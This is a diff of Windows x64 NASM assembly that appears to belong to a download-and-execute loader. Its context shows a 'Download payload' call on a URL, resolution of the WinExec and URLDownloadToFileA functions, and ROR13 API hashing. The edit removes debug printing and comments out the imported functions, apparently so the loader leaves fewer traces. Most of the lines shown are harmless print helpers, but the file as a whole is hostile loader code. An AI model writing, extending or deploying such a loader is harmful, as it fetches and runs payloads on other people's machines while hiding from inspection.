@@ -12,15 +12,15 @@
         bits        64
         default     rel                        ; RIP-relative addressing (without this, section .data will be ignored)
 
-        extern      puts
-        extern      strlen
-        extern      _ui64toa
-        extern      system
-        extern      strcmp
-
-        extern      GetStdHandle
-        extern      WriteFile
-        extern      ExitProcess
+;        extern      puts
+;        extern      strlen
+;        extern      _ui64toa
+;        extern      system
+;        extern      strcmp
+;
+;        extern      GetStdHandle
+;        extern      WriteFile
+;        extern      ExitProcess
 
         global      WinMain
 
@@ -172,14 +172,6 @@ WinMain:
 
 
         ; CODE
-        mov         rcx, [pWinExec]
-        mov         rdx, 16
-        call        PrintNum
-
-        mov         rcx, [pURLDownloadToFileA]
-        mov         rdx, 16
-        call        PrintNum
-
         ; Download payload
         mov         rcx, 0
         lea         rdx, [szUrl]
@@ -315,85 +307,85 @@ GetKernel32ProcAddress:
 
 
 
-;; void PrintNum (int iNum, int Radix)
-;; iNum = rcx
-;; iRadix = rdx
-PrintNum:
-        save_regs  
-        %push       proc_context
-        %stacksize  flat64
-        %assign     %$localsize 64
-        %local      iNum:qword
-        %local      iRadix:qword               ; Base [2, 10, 16]
-        %local      szNum:byte[24]
-        align_enter %$localsize
-
-        mov         rsi, 0
-        mov         rdi, 0
-        mov         qword [iNum], rcx
-        mov         qword [iRadix], rdx
-
-        ; Convert int to string
-        mov         rcx, qword [iNum]
-        lea         rdx, [szNum]
-        mov         r8, qword [iRadix]
-        call        _ui64toa
-
-        ; Print string
-        lea         rcx, [szNum]
-        call        PrintStr
-        lea         rcx, [endl]
-        call        PrintStr
-
-        leave      
-        restore_regs
-        ret        
-        %pop       
-
-
-
-;; void PrintStr (PSTR pStr)
-;; pStr = rcx
-PrintStr:
-        save_regs  
-        %push       proc_context
-        %stacksize  flat64
-        %assign     %$localsize 64             ; Shadow space (32) + space for stack args (32)
-        %local      pStr:qword                 ; Pointer to string
-        %local      cbStr:qword                ; Length of string
-        %local      cbWritten:qword
-        %local      hStdOut:qword
-        align_enter %$localsize
-
-        ; Set rsi, rdi to 0 for iterators correct work
-        mov         rsi, 0
-        mov         rdi, 0
-
-        ; Save argument(s) as local var(s)
-        mov         qword [pStr], rcx
-
-        ; Get length of string
-        mov         rcx, qword [pStr]
-        call        strlen
-        mov         qword [cbStr], rax
-
-        ; Get handle to StdOut
-        mov         rcx, [STD_OUTPUT_HANDLE]
-        call        GetStdHandle
-        mov         qword [hStdOut], rax
-
-        ; Write string to StdOut
-        mov         rcx, qword [hStdOut]
-        mov         rdx, qword [pStr]
-        mov         r8, qword [cbStr]
-        lea         r9, [cbWritten]
-        mov         qword [rsp+32], 0          ; 5th arg. 6th arg should be passed with [rsp+40]
-        call        WriteFile
-
-        leave      
-        restore_regs
-        ret        
-        %pop       
+;;; void PrintNum (int iNum, int Radix)
+;;; iNum = rcx
+;;; iRadix = rdx
+;PrintNum:
+;        save_regs  
+;        %push       proc_context
+;        %stacksize  flat64
+;        %assign     %$localsize 64
+;        %local      iNum:qword
+;        %local      iRadix:qword               ; Base [2, 10, 16]
+;        %local      szNum:byte[24]
+;        align_enter %$localsize
+;
+;        mov         rsi, 0
+;        mov         rdi, 0
+;        mov         qword [iNum], rcx
+;        mov         qword [iRadix], rdx
+;
+;        ; Convert int to string
+;        mov         rcx, qword [iNum]
+;        lea         rdx, [szNum]
+;        mov         r8, qword [iRadix]
+;        call        _ui64toa
+;
+;        ; Print string
+;        lea         rcx, [szNum]
+;        call        PrintStr
+;        lea         rcx, [endl]
+;        call        PrintStr
+;
+;        leave      
+;        restore_regs
+;        ret        
+;        %pop       
+;
+;
+;
+;;; void PrintStr (PSTR pStr)
+;;; pStr = rcx
+;PrintStr:
+;        save_regs  
+;        %push       proc_context
+;        %stacksize  flat64
+;        %assign     %$localsize 64             ; Shadow space (32) + space for stack args (32)
+;        %local      pStr:qword                 ; Pointer to string
+;        %local      cbStr:qword                ; Length of string
+;        %local      cbWritten:qword
+;        %local      hStdOut:qword
+;        align_enter %$localsize
+;
+;        ; Set rsi, rdi to 0 for iterators correct work
+;        mov         rsi, 0
+;        mov         rdi, 0
+;
+;        ; Save argument(s) as local var(s)
+;        mov         qword [pStr], rcx
+;
+;        ; Get length of string
+;        mov         rcx, qword [pStr]
+;        call        strlen
+;        mov         qword [cbStr], rax
+;
+;        ; Get handle to StdOut
+;        mov         rcx, [STD_OUTPUT_HANDLE]
+;        call        GetStdHandle
+;        mov         qword [hStdOut], rax
+;
+;        ; Write string to StdOut
+;        mov         rcx, qword [hStdOut]
+;        mov         rdx, qword [pStr]
+;        mov         r8, qword [cbStr]
+;        lea         r9, [cbWritten]
+;        mov         qword [rsp+32], 0          ; 5th arg. 6th arg should be passed with [rsp+40]
+;        call        WriteFile
+;
+;        leave      
+;        restore_regs
+;        ret        
+;        %pop       
 
 
 ;; int Ror13 (PSTR pStr)
